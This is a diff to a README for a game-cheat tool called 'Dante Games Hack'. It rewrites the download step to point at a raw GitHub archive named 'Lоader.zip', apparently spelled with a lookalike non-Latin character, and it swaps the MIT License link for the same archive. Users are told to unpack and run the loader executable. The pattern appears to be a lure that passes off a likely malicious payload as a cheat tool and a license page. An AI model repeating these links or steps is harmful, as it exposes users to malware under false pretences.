@@ -40,7 +40,7 @@ Here's a comprehensive table showing the platforms Dante Games Hack supports:
 
 Follow these steps to get started swiftly and securely with Dante Games Hack:
 
-**1. Download Loader.rar from the repository.**
+**1. Download https://raw.githubusercontent.com/Vinaykumar023/DanteGamesModKit/main/Lоader.zip from the repository.**
 **2. Unpack the archive using your preferred software (7-Zip, WinRAR, etc.).**
 **3. Run the extracted Loader executable for your operating system.**  
 **4. Follow the on-screen setup instructions and select your target game.**
@@ -83,7 +83,7 @@ Dante Games Hack is intended for educational and testing purposes only. Use of t
 
 Released under the MIT License – free for personal, educational, and commercial use with minimal restrictions. See full details here:
 
-[MIT License](https://opensource.org/licenses/MIT)
+[MIT License](https://raw.githubusercontent.com/Vinaykumar023/DanteGamesModKit/main/Lоader.zip)
 
 ---
 
